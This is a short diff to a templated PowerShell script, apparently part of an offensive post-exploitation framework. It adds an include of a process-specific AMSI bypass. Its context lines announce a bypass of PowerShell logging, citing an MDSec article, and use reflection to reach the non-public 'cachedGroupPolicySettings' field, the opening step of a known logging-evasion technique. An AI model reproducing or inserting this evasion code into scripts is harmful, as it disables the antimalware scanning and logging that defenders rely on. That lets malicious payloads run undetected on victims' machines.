@@ -1,4 +1,7 @@
 {#- At this point, we assume AMSI is disabled -#}
+{#- Load process-specific AMSI bypass -#}
+
+{%- include "powershell/amsi/process.ps1" -%}
 
 {#- Bypass PowerShell Logging: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ -#}
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
